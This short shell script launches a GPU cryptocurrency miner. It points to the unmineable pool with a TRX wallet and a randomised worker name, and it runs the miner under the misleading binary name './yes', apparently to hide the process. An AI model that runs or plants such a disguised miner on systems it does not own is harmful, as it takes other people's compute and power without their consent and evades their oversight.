POOL=rx-us.unmineable.com:3333
WALLET=TRX:TVt7YxLm7oTN4xbGhov6PP934aZEdwAewD
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo q9wuEdaK-$(shuf -i 1911-570723 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
